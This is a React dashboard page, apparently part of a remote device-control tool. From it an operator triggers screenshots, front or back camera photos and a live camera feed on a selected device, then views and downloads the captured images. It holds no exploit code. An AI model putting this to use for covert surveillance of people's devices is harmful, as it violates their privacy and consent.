import React from 'react';
import { Download, Eye, Image as ImageIcon } from 'lucide-react';
import { useDashboard } from '../context/DashboardContext';

export default function MediaPage() {
  const {
    cameraLiveStatus,
    filteredPhotos,
    isLiveCameraActive,
    latestCameraPhoto,
    selectedCameraLens,
    selectedDeviceId,
    sendCommand,
    setSelectedCameraLens,
    socketServerUrl,
  } = useDashboard();

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
      <div className="glass-panel" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h3 style={{ fontSize: '18px', fontWeight: '700' }}>Image Captures</h3>
          <p style={{ color: 'var(--color-text-muted)', fontSize: '13px' }}>Screenshots and camera photos captured on the device.</p>
        </div>
        <div style={{ display: 'flex', gap: '10px' }}>
          <select
            value={selectedCameraLens}
            onChange={event => setSelectedCameraLens(event.target.value)}
            className="form-input"
            style={{ minWidth: '130px' }}
          >
            <option value="back">Back Camera</option>
            <option value="front">Front Camera</option>
          </select>
          <button
            className="btn btn-danger"
            onClick={() => sendCommand('START_LIVE_CAMERA', { camera: selectedCameraLens, intervalMs: 1500 })}
            disabled={isLiveCameraActive}
          >
            {isLiveCameraActive ? 'Live Camera Active' : 'Start Live Camera'}
          </button>
          <button
            className="btn btn-outline"
            onClick={() => sendCommand('STOP_LIVE_CAMERA')}
            disabled={!isLiveCameraActive}
          >
            Stop Live Camera
          </button>
          <button className="btn btn-primary" onClick={() => sendCommand('TAKE_SCREENSHOT')}>
            Capture Screen
          </button>
          <button className="btn btn-outline" onClick={() => sendCommand('TAKE_PHOTO', { camera: selectedCameraLens })}>
            Take Photo ({selectedCameraLens === 'front' ? 'Front' : 'Back'})
          </button>
        </div>
      </div>

      <div className="glass-panel" style={{ padding: '16px' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <h4 style={{ fontSize: '16px', fontWeight: '700' }}>Live Camera Feed</h4>
            <span
              style={{
                fontSize: '11px',
                fontWeight: '700',
                textTransform: 'uppercase',
                padding: '4px 10px',
                borderRadius: '999px',
                color: isLiveCameraActive ? 'var(--accent-emerald)' : 'var(--color-text-darker)',
                background: isLiveCameraActive ? 'rgba(16,185,129,0.15)' : 'rgba(255,255,255,0.06)',
                border: isLiveCameraActive ? '1px solid rgba(16,185,129,0.45)' : '1px solid rgba(255,255,255,0.1)',
              }}
            >
              {isLiveCameraActive ? 'LIVE' : 'IDLE'}
            </span>
          </div>
          <span style={{ fontSize: '12px', color: 'var(--color-text-muted)' }}>
            {cameraLiveStatus[selectedDeviceId]?.camera ? `Lens: ${cameraLiveStatus[selectedDeviceId].camera}` : 'Lens: back'}
          </span>
        </div>

        {!latestCameraPhoto ? (
          <div
            style={{
              minHeight: '260px',
              borderRadius: '10px',
              border: '1px dashed rgba(255,255,255,0.18)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              color: 'var(--color-text-muted)',
            }}
          >
            Waiting for camera frames...
          </div>
        ) : (
          <div style={{ position: 'relative', borderRadius: '10px', overflow: 'hidden', background: '#05070d' }}>
            <img
              src={`${socketServerUrl}${latestCameraPhoto.fileUrl}?t=${new Date(latestCameraPhoto.timestamp).getTime()}`}
              alt="Live camera"
              style={{ width: '100%', maxHeight: '420px', objectFit: 'contain', display: 'block' }}
            />
            <div
              style={{
                position: 'absolute',
                left: '12px',
                bottom: '12px',
                background: 'rgba(0,0,0,0.65)',
                border: '1px solid rgba(255,255,255,0.2)',
                borderRadius: '8px',
                padding: '6px 10px',
                fontSize: '12px',
                color: '#fff',
              }}
            >
              Last frame: {new Date(latestCameraPhoto.timestamp).toLocaleTimeString()}
            </div>
          </div>
        )}
      </div>

      {filteredPhotos.length === 0 ? (
        <div className="glass-panel" style={{ textAlign: 'center', padding: '60px' }}>
          <ImageIcon size={48} style={{ color: 'var(--color-text-muted)', marginBottom: '12px' }} />
          <p style={{ color: 'var(--color-text-muted)' }}>No images captured yet. Click Capture Screen or Take Photo above.</p>
        </div>
      ) : (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '20px' }}>
          {filteredPhotos.map((photo, index) => (
            <div key={index} className="glass-panel" style={{ padding: '12px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <div
                style={{
                  height: '240px',
                  background: '#04060b',
                  borderRadius: '8px',
                  overflow: 'hidden',
                  position: 'relative',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                }}
              >
                <img
                  src={`${socketServerUrl}${photo.fileUrl}`}
                  alt={photo.type}
                  style={{ maxWidth: '100%', maxHeight: '100%', objectFit: 'contain' }}
                />
                <span
                  style={{
                    position: 'absolute',
                    top: '10px',
                    left: '10px',
                    background: 'rgba(0,0,0,0.7)',
                    padding: '4px 8px',
                    borderRadius: '4px',
                    fontSize: '11px',
                    color: '#fff',
                    textTransform: 'uppercase',
                    fontWeight: 'bold',
                    border: '1px solid rgba(255,255,255,0.1)',
                  }}
                >
                  {photo.type === 'screenshot' ? 'Screenshot' : `Camera (${photo.type})`}
                </span>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <div style={{ fontSize: '11px', color: 'var(--color-text-darker)' }}>
                    {new Date(photo.timestamp).toLocaleDateString()}
                  </div>
                  <div style={{ fontSize: '13px', fontWeight: '600' }}>
                    {new Date(photo.timestamp).toLocaleTimeString()}
                  </div>
                </div>

                <div style={{ display: 'flex', gap: '8px' }}>
                  <a
                    href={`${socketServerUrl}${photo.fileUrl}`}
                    target="_blank"
                    rel="noreferrer"
                    className="btn btn-outline"
                    style={{ padding: '6px 10px' }}
                  >
                    <Eye size={14} />
                  </a>
                  <a
                    href={`${socketServerUrl}${photo.fileUrl}`}
                    download
                    className="btn btn-primary"
                    style={{ padding: '6px 10px' }}
                  >
                    <Download size={14} />
                  </a>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
